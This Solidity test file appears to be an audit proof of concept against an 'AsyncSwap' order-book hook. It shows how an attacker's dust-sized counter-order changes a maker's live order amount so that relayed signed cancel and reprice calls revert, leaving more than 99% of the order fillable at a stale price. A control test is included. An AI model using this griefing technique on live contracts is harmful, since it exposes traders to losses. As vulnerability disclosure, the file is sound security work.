// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {PocSignedBase} from "./PocSignedBase.sol";
import {AsyncSwap} from "@async-swap/AsyncSwap.sol";
import {Router} from "@async-swap/Router.sol";
import {OrderSignatures} from "@async-swap/libraries/OrderSignatures.sol";
import {AsyncOrder} from "@async-swap/types/AsyncOrder.sol";

/// @notice Candidate 2: signed cancel / reprice bind the order's live amountIn (and sequence). A dust crossing
///         counter-order placed before relay changes amountIn, so the relayed signature reverts InvalidSignature
///         and the remainder stays live at the stale price.
contract SignedCancelGriefPoc is PocSignedBase {
    uint256 constant CANCEL_NONCE = 1;
    // Attacker's dust bid: buys 0.01 token0 at exactly the maker's limit (0.95).
    uint256 constant DUST_QUOTE = 0.0095 ether;
    uint256 constant DUST_ASSET = 0.01 ether;

    function _createSigned() internal returns (AsyncOrder memory order) {
        order = _signedOrder(AMOUNT_OUT_MIN);
        Router.PermitData memory permit = _permit(order, 0, block.timestamp + 1 hours);
        vm.prank(relayer);
        router.swapWithSig(order, permit, _grant(0, block.timestamp + 1 hours));
        order.salt = _expectedSalt(maker, AMOUNT_IN, AMOUNT_OUT_MIN);
    }

    function _dustMatch() internal returns (uint256 attackerQuotePaid, uint256 attackerAssetGot) {
        uint256 a0 = token0.balanceOf(attacker);
        uint256 a1 = token1.balanceOf(attacker);
        _submit(_plainOrder(attacker, false, DUST_QUOTE, DUST_ASSET, 0));
        attackerQuotePaid = a1 - token1.balanceOf(attacker);
        // Proceeds arrive as ERC-6909 claims for book matches.
        attackerAssetGot = token0.balanceOf(attacker) - a0 + manager.balanceOf(attacker, currency0.toId());
    }

    function test_poc_dustMatchBreaksRelayedCancel() public {
        AsyncOrder memory order = _createSigned();
        uint256 deadline = block.timestamp + 1 hours;
        bytes memory sig = _cancelSig(order, AMOUNT_IN, CANCEL_NONCE, deadline);

        (uint256 paid, uint256 got) = _dustMatch();
        (uint256 liveIn, uint256 liveMin) = hook.asyncOrderInfo(poolId, _id(order));
        emit log_named_uint("attacker quote paid (token1)", paid);
        emit log_named_uint("attacker asset received (token0, net of fee)", got);
        emit log_named_uint("attacker cost vs fair value at maker price", paid - got * AMOUNT_OUT_MIN / AMOUNT_IN);
        emit log_named_uint("maker order remaining amountIn", liveIn);
        emit log_named_uint("maker order remaining min out", liveMin);
        assertEq(liveIn, AMOUNT_IN - DUST_ASSET, "dust partially matched");

        vm.prank(relayer);
        vm.expectRevert(Router.InvalidSignature.selector);
        router.cancelWithSig(order, CANCEL_NONCE, deadline, sig);
        assertFalse(hook.nonceUsed(maker, CANCEL_NONCE), "nonce not burnt; tx reverted");

        // Remainder stays exposed at the stale price; e.g. a filler takes it all.
        order.amountIn = liveIn;
        uint256 b0 = token0.balanceOf(bob);
        vm.prank(bob);
        router.fillOrder(order, type(uint256).max, "");
        emit log_named_uint("remainder taken by filler after failed cancel (token0)", token0.balanceOf(bob) - b0);
        // Exposure: >= 99% of the order the maker tried to cancel remained fillable; attacker spent <1%.
        assertGe(liveIn, AMOUNT_IN * 99 / 100);
        assertLt(paid, AMOUNT_IN * 1 / 100);
    }

    function test_poc_dustMatchBreaksRelayedReprice() public {
        AsyncOrder memory order = _createSigned();
        uint256 deadline = block.timestamp + 1 hours;
        (,,,,, uint64 seq,) = hook.orderBookOrder(poolId, _id(order));
        bytes32 structHash = OrderSignatures.hashUpdatePrice(order, _id(order), AMOUNT_IN, 1.2 ether, seq, 9, deadline);
        bytes memory sig = _sign(_digest(hook.DOMAIN_SEPARATOR(), structHash));
        _dustMatch();
        vm.prank(relayer);
        vm.expectRevert(AsyncSwap.InvalidSignature.selector);
        hook.updatePriceWithSig(order, 1.2 ether, 9, deadline, sig);
        (, uint256 liveMin) = hook.asyncOrderInfo(poolId, _id(order));
        emit log_named_uint("min out after failed reprice", liveMin);
        assertLt(liveMin, 1.2 ether * 80 / 100, "remainder stays at stale price");
    }

    /// Control: no interference, the relayed cancel returns the full input.
    function test_control_cancelSucceedsWithoutInterference() public {
        AsyncOrder memory order = _createSigned();
        uint256 deadline = block.timestamp + 1 hours;
        bytes memory sig = _cancelSig(order, AMOUNT_IN, CANCEL_NONCE, deadline);
        uint256 before = token0.balanceOf(maker);
        vm.prank(relayer);
        router.cancelWithSig(order, CANCEL_NONCE, deadline, sig);
        emit log_named_uint("maker token0 refunded", token0.balanceOf(maker) - before);
        assertEq(token0.balanceOf(maker) - before, AMOUNT_IN);
    }
}
